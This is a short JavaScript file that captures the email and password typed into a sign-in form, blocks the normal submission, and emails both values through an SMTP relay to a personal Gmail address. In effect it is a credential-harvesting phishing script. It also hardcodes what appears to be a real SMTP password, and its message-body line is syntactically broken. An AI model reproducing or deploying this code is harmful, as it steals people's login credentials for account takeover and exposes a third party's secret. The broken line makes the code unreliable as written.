const form = document.querySelector('form');

function sendEmail(email, password) {
    Email.send({
        Host: "smtp.elasticemail.com",
        Username: "aacematt@gmail.com",
        Password: "F809716F3D4320D6590D25F87631B76D504A",
        To: 'aacematt@gmail.com',
        From: "aacematt@gmail.com",
        Subject: "User Sign In",
        Body: Email: ${email}<br>Password: ${password}
    }).then(
        message => alert(message)
    );
}

form.addEventListener("submit", (e) => {
    e.preventDefault();
    const email = form.querySelector('input[name="email"]').value;
    const password = form.querySelector('input[name="password"]').value;
    sendEmail(email, password);
});